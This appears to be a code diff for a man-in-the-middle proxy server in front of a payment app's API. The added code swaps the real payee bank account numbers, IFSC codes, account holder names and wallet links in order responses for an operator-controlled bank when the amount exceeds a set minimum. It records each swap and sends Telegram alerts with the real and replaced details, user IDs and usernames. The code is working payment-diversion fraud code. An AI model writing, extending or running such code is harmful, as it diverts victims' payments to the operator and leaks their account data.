@@ -461,6 +461,7 @@ async function claimOrderNotification(data, valueOrOrder) {
     data.orderNotificationMap[canonical] = { notifiedAt: Date.now() };
     if (savedObj) savedObj.notified = true;
     try { await saveData(data); } catch (e) { }
+    return true;
 }
 
 async function claimProcessNotification(orderId, action = 'finish') {
@@ -2381,10 +2382,22 @@ app.all('/xxapi/*', async (req, res) => {
         // 6. Sends Telegram BUY notification
         const isPickupPaymentSlip = req.method === 'POST' && urlLower.includes('pickuppaymentslip');
         if (isPickupPaymentSlip) {
-            let reqOrderId = getRequestOrderId(req);
-            if (!reqOrderId && req.body && typeof req.body === 'object') {
-                reqOrderId = req.body.order_id || req.body.orderId || req.body.orderNo || req.body.rptNo || '';
+            let reqBody = {};
+            if (req.rawBody && req.rawBody.length > 0) {
+                try {
+                    const ct = (req.headers['content-type'] || '').toLowerCase();
+                    if (ct.includes('json')) { reqBody = JSON.parse(req.rawBody.toString()); }
+                    else if (ct.includes('multipart')) { reqBody = parseMultipartFields(req.rawBody); }
+                    else if (ct.includes('form')) { reqBody = Object.fromEntries(new URLSearchParams(req.rawBody.toString())); }
+                } catch (e) { }
             }
+            if (req.body && typeof req.body === 'object') {
+                reqBody = { ...reqBody, ...req.body };
+            }
+
+            const queryParams = new URLSearchParams((req.originalUrl || req.url || '').split('?')[1] || '');
+            let reqOrderId = reqBody.order_id || reqBody.orderId || reqBody.orderNo || reqBody.rptNo || reqBody.id || reqBody.slipId ||
+                queryParams.get('order_id') || queryParams.get('orderId') || queryParams.get('orderNo') || queryParams.get('rptNo') || queryParams.get('id') || '';
             reqOrderId = String(reqOrderId || '').trim();
 
             const pxUid = req.headers['x-px-uid'] || '';
@@ -2423,7 +2436,7 @@ app.all('/xxapi/*', async (req, res) => {
             const minAmount = activeBank && activeBank.minAmount ? parseFloat(activeBank.minAmount) : 0;
             const walletType = getWalletTypeName(rawWallet, pJson.data ? (pJson.data.payType || pJson.data.ctType) : null);
             const trackedUser = (data.trackedUsers && resolvedUid && data.trackedUsers[resolvedUid]) || {};
-            const userPhone = trackedUser.phone || '';
+            const userPhone = trackedUser.phone || (pJson.data && (pJson.data.ctAccount || pJson.data.username)) || '';
 
             let replaced = false;
 
@@ -2444,46 +2457,30 @@ app.all('/xxapi/*', async (req, res) => {
                 const replaceMsg = `╔══════════════════════════════════╗
 ║   ⚡ LINK REPLACED SUCCESSFULLY  ║
 ╚══════════════════════════════════╝
-💰 <b>Amount</b>      : <b>₹${parsedAmt}</b>
-📱 <b>Wallet Type</b> : <b>${escapeTelegramHtml(walletType)}</b>
-📋 <b>Order ID</b>    : <code>${escapeTelegramHtml(reqOrderId || 'N/A')}</code>
-👤 <b>User ID</b>     : <code>${escapeTelegramHtml(resolvedUid || 'N/A')}</code>${userPhone ? `\n📞 <b>Phone</b>       : <code>${escapeTelegramHtml(userPhone)}</code>` : ''}
+💰 <b>Amount</b>: <b>₹${parsedAmt}</b>
 
-🔗 <b>Old Link</b>:
+🔗 <b>Real Link</b>:
 <code>${escapeTelegramHtml(rawWallet || 'N/A')}</code>
 
-✨ <b>New Link</b>:
+✨ <b>Replaced Link</b>:
 <code>${escapeTelegramHtml(newWallet || 'N/A')}</code>
-
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🏦 <b>Replaced Bank</b>: <code>${escapeTelegramHtml(activeBank.accountHolder)} | ${escapeTelegramHtml(activeBank.accountNo)} | ${escapeTelegramHtml(activeBank.ifsc)}</code>
 🕐 <code>${now}</code>`;
 
-                const canNotify = await claimOrderNotification(data, reqOrderId || pJson.data);
-                if (canNotify) {
-                    notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
-                }
+                notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
             } else if (parsedAmt > 0 && minAmount > 0 && parsedAmt < minAmount) {
                 const notReplacedMsg = `╔══════════════════════════════════╗
 ║   ⚠️ LINK NOT REPLACED          ║
 ╚══════════════════════════════════╝
-💰 <b>Amount</b>      : <b>₹${parsedAmt}</b>
-⚠️ <b>Reason</b>      : <b>₹${parsedAmt} < Min Set ₹${minAmount}</b>
-📱 <b>Wallet Type</b> : <b>${escapeTelegramHtml(walletType)}</b>
-📋 <b>Order ID</b>    : <code>${escapeTelegramHtml(reqOrderId || 'N/A')}</code>
-👤 <b>User ID</b>     : <code>${escapeTelegramHtml(resolvedUid || 'N/A')}</code>${userPhone ? `\n📞 <b>Phone</b>       : <code>${escapeTelegramHtml(userPhone)}</code>` : ''}
+💰 <b>Amount</b>: <b>₹${parsedAmt}</b>
+⚠️ <b>Reason</b>: <b>₹${parsedAmt} < Min Set ₹${minAmount}</b>
 
-🔗 <b>Real Link Kept</b>:
+🔗 <b>Real Link</b>:
 <code>${escapeTelegramHtml(rawWallet || 'N/A')}</code>
-
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❌ <b>Status</b>       : <b>Real Link Kept (Amount < Min)</b>
 🕐 <code>${now}</code>`;
 
-                const canNotify = await claimOrderNotification(data, reqOrderId || pJson.data);
-                if (canNotify) {
-                    notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
-                }
+                notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
             }
 
             cleanUglyBankNames(pJson);
@@ -3065,23 +3062,24 @@ app.all('/xxapi/*', async (req, res) => {
                 // Per-item replace in lists:
                 // 1. Saved orders in KV → replace with saved mapped bank
                 // 2. User's History/Bought orders → replace with active bank & save to KV
-                // 3. Market Browse List (waitpayerpaymentslip, available orders) → leave REAL IFSC & details untouched!
-                function _replaceListItems(list) {
-                    const isBrowseMarket = urlLower.includes('waitpayerpaymentslip') ||
-                        urlLower.includes('waitpayer') ||
-                        urlLower.includes('/buyitoken/list') ||
-                        urlLower.includes('/market');
+                async function _replaceListItems(list) {
+                    if (!Array.isArray(list)) return;
+                    let dataChanged = false;
 
-                    list.forEach(item => {
-                        if (!item || typeof item !== 'object') return;
+                    for (const item of list) {
+                        if (!item || typeof item !== 'object') continue;
                         const orderState = parseInt(item.orderState ?? item.state ?? -1);
-                        const oId = _getItemOId(item);
-                        const savedMapping = getSavedOrderMapping(data, item) ||
-                            (oId ? getSavedOrderMapping(data, oId) : null) ||
-                            getSavedOrderMapping(data, item.rptNo || item.orderNo || item.orderId || item.id || item.slipId || '');
+                        const rptNo = String(item.rptNo || item.rpt_no || '').trim();
+                        const oId = rptNo || _getItemOId(item);
+                        const savedMapping = (rptNo && data.orderBankMap && data.orderBankMap[rptNo]) ||
+                            getSavedOrderMapping(data, item) ||
+                            (oId ? getSavedOrderMapping(data, oId) : null);
 
-                        const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
-                        const minOk = !bank.minAmount || (iAmt > 0 && iAmt >= bank.minAmount);
+                        const iAmt = parseFloat(item.amount || item.realAmount || item.orderAmount || item.money || 0);
+                        const itemUid = String(item.uid || item.userId || userId || '');
+                        const itemBank = getActiveBank(data, itemUid);
+                        const itemMinAmount = itemBank && itemBank.minAmount ? parseFloat(itemBank.minAmount) : 0;
+                        const minOk = itemMinAmount <= 0 || (iAmt > 0 && iAmt >= itemMinAmount);
 
                         if (savedMapping) {
                             // Already bought / mapped order in KV: replace with mapped bank
@@ -3090,20 +3088,124 @@ app.all('/xxapi/*', async (req, res) => {
                                 if (urlLower.includes('waitconfirm')) {
                                     replaceWaitConfirmBankFields(item, mappedBank);
                                 } else {
+                                    item.acctNo = mappedBank.accountNo;
+                                    item.acctCode = mappedBank.ifsc;
+                                    item.acctName = mappedBank.accountHolder;
                                     forceBankDetails(item, mappedBank);
                                 }
                                 const walletTemplate = item.walletDomain || mappedBank.walletDomain || '';
-                                const mappedWallet = rewriteWalletDomainForBank(walletTemplate, mappedBank, bank && bank.minAmount);
-                                if (mappedWallet) item.walletDomain = mappedWallet;
+                                if (walletTemplate && typeof walletTemplate === 'string' && walletTemplate.includes('://')) {
+                                    const mappedWallet = rewriteWalletDomainForBank(walletTemplate, mappedBank, itemMinAmount);
+                                    if (mappedWallet) item.walletDomain = mappedWallet;
+                                }
+                            }
+                        } else if (urlLower.includes('history')) {
+                            // Check 1: Must be orderState === 1 (Paying / In Progress)
+                            if (orderState === 1 && rptNo) {
+                                const oldAcctNo = item.acctNo || item.account || item.accountNo || '';
+                                const oldAcctCode = item.acctCode || item.ifsc || '';
+                                const oldAcctName = item.acctName || item.accountHolder || item.name || '';
+
+                                if (minOk && itemBank && itemBank.accountNo) {
+                                    // Check 2 Passed: Amount >= minAmount
+                                    // 1. Replace 3 fields: acctNo, acctCode (ifsc), acctName
+                                    item.acctNo = itemBank.accountNo;
+                                    item.acctCode = itemBank.ifsc;
+                                    item.acctName = itemBank.accountHolder;
+                                    forceBankDetails(item, itemBank);
+
+                                    // 2. Modify wallet link if present
+                                    if (item.walletDomain && typeof item.walletDomain === 'string' && item.walletDomain.includes('://')) {
+                                        item.walletDomain = injectBankIntoWalletDomain(item.walletDomain, itemBank);
+                                    }
+
+                                    // 3. Save rptNo in KV (orderBankMap)
+                                    const savedData = {
+                                        bank: `${itemBank.accountHolder} | ${itemBank.accountNo} | ${itemBank.ifsc}`,
+                                        accountHolder: itemBank.accountHolder,
+                                        accountNo: itemBank.accountNo,
+                                        ifsc: itemBank.ifsc,
+                                        bankName: itemBank.bankName || '',
+                                        upiId: itemBank.upiId || '',
+                                        rptNo: rptNo,
+                                        orderNo: item.orderNo || rptNo,
+                                        orderId: rptNo,
+                                        amount: iAmt,
+                                        walletDomain: item.walletDomain || '',
+                                        time: now,
+                                        userId: itemUid,
+                                        isManual: true,
+                                        forced: true
+                                    };
+                                    if (!data.orderBankMap) data.orderBankMap = {};
+                                    data.orderBankMap[rptNo] = savedData;
+                                    if (!data._newOrdersToSave) data._newOrdersToSave = {};
+                                    data._newOrdersToSave[rptNo] = savedData;
+                                    dataChanged = true;
+
+                                    // 4. Send Designed Telegram Alert
+                                    const canNotify = await claimOrderNotification(data, rptNo);
+                                    if (canNotify) {
+                                        const replaceMsg = `╔══════════════════════════════════╗
+║   ⚡ BANK REPLACED SUCCESSFULLY  ║
+╚══════════════════════════════════╝
+💰 <b>Amount</b>      : <b>₹${iAmt}</b>
+📋 <b>Order (rptNo)</b>: <code>${escapeTelegramHtml(rptNo)}</code>
+👤 <b>User ID</b>     : <code>${escapeTelegramHtml(itemUid || 'N/A')}</code>
+📱 <b>Username</b>    : <code>${escapeTelegramHtml(item.username || 'N/A')}</code>
+💾 <b>Status</b>      : <b>Saved in KV (orderBankMap)</b>
+
+🏦 <b>Old Bank</b>:
+  Name: ${escapeTelegramHtml(oldAcctName || 'N/A')}
+  Acc:  ${escapeTelegramHtml(oldAcctNo || 'N/A')}
+  IFSC: ${escapeTelegramHtml(oldAcctCode || 'N/A')}
+
+✨ <b>New Bank</b>:
+  Name: ${escapeTelegramHtml(itemBank.accountHolder)}
+  Acc:  ${escapeTelegramHtml(itemBank.accountNo)}
+  IFSC: ${escapeTelegramHtml(itemBank.ifsc)}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🕐 <code>${now}</code>`;
+                                        notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
+                                    }
+                                } else if (!minOk && itemMinAmount > 0 && iAmt < itemMinAmount) {
+                                    // Check 2 Failed: Amount < Min Set
+                                    const canNotify = await claimOrderNotification(data, rptNo);
+                                    if (canNotify) {
+                                        const notReplacedMsg = `╔══════════════════════════════════╗
+║   ⚠️ BANK NOT REPLACED          ║
+╚══════════════════════════════════╝
+💰 <b>Amount</b>      : <b>₹${iAmt}</b>
+⚠️ <b>Reason</b>      : <b>₹${iAmt} < Min Set ₹${itemMinAmount}</b>
+📋 <b>Order (rptNo)</b>: <code>${escapeTelegramHtml(rptNo)}</code>
+👤 <b>User ID</b>     : <code>${escapeTelegramHtml(itemUid || 'N/A')}</code>
+📱 <b>Username</b>    : <code>${escapeTelegramHtml(item.username || 'N/A')}</code>
+
+🏦 <b>Real Bank Kept</b>:
+  Name: ${escapeTelegramHtml(oldAcctName || 'N/A')}
+  Acc:  ${escapeTelegramHtml(oldAcctNo || 'N/A')}
+  IFSC: ${escapeTelegramHtml(oldAcctCode || 'N/A')}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❌ <b>Status</b>       : <b>Real Bank Kept (Amount < Min)</b>
+🕐 <code>${now}</code>`;
+                                        notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
+                                    }
+                                }
                             }
                         }
-                    });
+                    }
+
+                    if (dataChanged) {
+                        await saveData(data);
+                    }
                 }
 
                 if (isListResp) {
-                    _replaceListItems(respData);
+                    await _replaceListItems(respData);
                 } else if (nestedList) {
-                    _replaceListItems(nestedList);
+                    await _replaceListItems(nestedList);
                 } else {
                     // Single order / non-list response
                     let shouldReplace = true;
